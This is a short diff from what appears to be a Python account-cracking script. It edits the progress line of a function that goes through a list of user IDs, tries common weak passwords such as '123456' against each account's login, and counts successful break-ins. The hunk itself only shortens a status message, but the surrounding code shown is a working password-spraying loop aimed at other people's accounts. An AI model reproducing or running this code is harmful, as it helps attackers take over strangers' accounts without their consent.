@@ -448,7 +448,7 @@ def ____old____(uid,total_ids):
     session = requests.session()
     
     try:
-        sys.stdout.write(f"[😈]\033[1;35m𝗦𝗛𝗔𝗡𝗜~𝗠𝗔𝗟𝗜𝗞  {green}{loop}/{red}{total_ids} | {green}OK:{len(oks)} | {purple}Be Patient\033[0m\r");sys.stdout.flush()
+        sys.stdout.write(f"[😈]\033[1;35m𝗦𝗛𝗔𝗡𝗜~𝗠𝗔𝗟𝗜𝗞  {green}{loop}/{red}{total_ids} | {green}OK:{len(oks)}\033[0m\r");sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789','1234567890'):
             data = {
                 'adid': str(uuid.uuid4()),
